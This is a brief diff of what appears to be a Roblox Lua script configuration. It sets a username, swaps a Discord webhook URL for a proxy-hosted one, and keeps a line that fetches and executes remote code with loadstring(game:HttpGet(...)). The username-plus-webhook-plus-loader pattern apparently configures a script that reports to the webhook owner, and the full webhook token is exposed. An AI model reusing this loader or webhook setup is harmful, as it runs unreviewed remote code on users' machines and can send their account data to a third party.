@@ -1,4 +1,4 @@
 username = "KAKTAKTOS"
-webhook = "https://discord.com/api/webhooks/1361027333439357141/H1upbM7uLXqnAAAQgusTj3jOg1Gercmv5hDOqNu_G3HbWrsRNM9cNioju1BkHXYTqSfg"
+webhook = "https://webhook.lewisakura.moe/api/webhooks/1361027333439357141/H1upbM7uLXqnAAAQgusTj3jOg1Gercmv5hDOqNu_G3HbWrsRNM9cNioju1BkHXYTqSfg"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/RedX/refs/heads/main/IStock2025',true))()
